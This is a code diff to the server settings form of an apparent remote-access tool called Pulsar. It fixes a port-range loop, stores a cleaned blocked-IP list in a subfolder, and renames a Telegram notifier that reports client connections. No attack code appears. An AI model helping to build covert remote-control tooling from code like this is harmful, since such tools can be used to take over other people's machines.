@@ -273,7 +273,7 @@ namespace Pulsar.Server.Forms
                     if (bounds.Length == 2 && ushort.TryParse(bounds[0], out var a) && ushort.TryParse(bounds[1], out var b))
                     {
                         if (a > b) { var t = a; a = b; b = t; }
-                        for (var p = a; p <= b; p++) list.Add((ushort)p);
+                        for (int p = a; p <= b; p++) list.Add((ushort)p);
                     }
                 }
                 else if (ushort.TryParse(part, out var single))
@@ -418,10 +418,12 @@ namespace Pulsar.Server.Forms
             }
 
             string[] ipList = BlockedRichTB.Text.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
-            var blockedIPs = ipList.ToList();
-            string filePath = "blocked.json";
+            var blockedIPs = ipList.Select(ip => ip.Trim()).Where(ip => ip.Length > 0).Distinct(StringComparer.OrdinalIgnoreCase).ToList();
+            string pulsarPath = Path.Combine(Application.StartupPath, "PulsarStuff");
+            string filePath = Path.Combine(pulsarPath, "blocked.json");
             try
             {
+                Directory.CreateDirectory(pulsarPath);
                 string json = JsonConvert.SerializeObject(blockedIPs, Formatting.Indented);
                 File.WriteAllText(filePath, json);
             }
@@ -515,7 +517,7 @@ namespace Pulsar.Server.Forms
                     return;
                 }
 
-                string response = await Pulsar.Server.TelegramSender.Send.SendConnectionMessage(
+                string response = await Pulsar.Server.TelegramSender.TelegramService.SendConnectionMessage(
                     txtTelegramToken.Text,
                     txtTelegramChatID.Text,
                     "TestClient123",
